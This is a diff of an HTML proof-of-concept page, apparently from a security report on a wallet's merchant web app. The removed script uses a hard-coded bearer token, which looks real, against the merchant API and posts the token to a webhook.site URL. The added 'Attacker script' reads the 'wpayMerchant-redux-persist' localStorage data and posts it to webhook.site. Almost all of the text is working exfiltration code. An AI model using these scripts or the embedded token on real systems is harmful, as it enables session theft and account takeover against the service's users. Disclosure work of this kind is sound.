@@ -9,41 +9,16 @@
   <p>Open console (F12) and check the logs.</p>
 
 <script>
-  alert("✅ PoC page loaded.");
-  console.log("💡 Script started");
-
-  const stolenToken = "Bearer eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoyMjQxNDA2N30.fhIjbSJy6YqifI60URimGdVwPK3t_cM70AUXklvcaSXOoVYDjoNtDpleWEP9h3FCS0ZuSM7k8cY5D6Jfdb_DOA";
-
-  // Hit the target API
-  fetch("https://pay.wallet.tg/wpay/website-api/v1/merchant", {
-    method: "GET",
-    headers: {
-      "Authorization": stolenToken,
-      "Accept": "application/json"
-    }
-  })
-  .then(response => {
-    console.log("✅ API Request sent. Status:", response.status);
-
-    // Proof of exfiltration - simulate leak to attacker's server
-    return fetch("https://webhook.site/cfb89b16-1571-4db3-b282-adc26a5c8f57", {
+  // Attacker script
+  const data = localStorage.getItem("wpayMerchant-redux-persist");
+  if (data) {
+    fetch("https://webhook.site/your-id", {
       method: "POST",
-      headers: {
-        "Content-Type": "application/json"
-      },
-      body: JSON.stringify({
-        token: stolenToken,
-        merchantApiStatus: response.status,
-        msg: "Token used from external origin."
-      })
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ exfiltrated: data })
     });
-  })
-  .then(() => {
-    console.log("📡 Webhook exfiltration attempted.");
-  })
-  .catch(err => {
-    console.error("❌ Script error:", err);
-  });
+  }
 </script>
+
 </body>
 </html>
